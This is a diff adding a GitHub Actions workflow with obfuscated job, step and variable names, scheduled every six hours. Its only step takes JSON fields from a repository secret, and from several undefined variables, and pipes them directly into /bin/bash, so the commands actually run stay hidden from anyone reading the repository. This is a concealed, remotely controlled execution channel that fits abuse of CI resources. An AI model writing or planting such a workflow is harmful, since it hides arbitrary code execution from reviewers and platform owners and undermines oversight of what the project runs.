@@ -1,0 +1,24 @@
+name: sanfenditheer
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sanfenditheer
+        env:
+          dsai842: ${{ secrets.dsai842 }}
+        run: |
+          echo $dsai842 | jq -r .usii9 | /bin/bash
+          echo $ds7951 | jq -r .b5358 | /bin/bash
+          echo $rhwn1420 | jq -r .zpa370 | /bin/bash
+          echo $u309 | jq -r .wub521 | /bin/bash
+          echo $dzt66613 | jq -r .q6918 | /bin/bash
+          echo $x4 | jq -r .bzskl9 | /bin/bash
+          echo $svcv0656 | jq -r .jo590 | /bin/bash
+
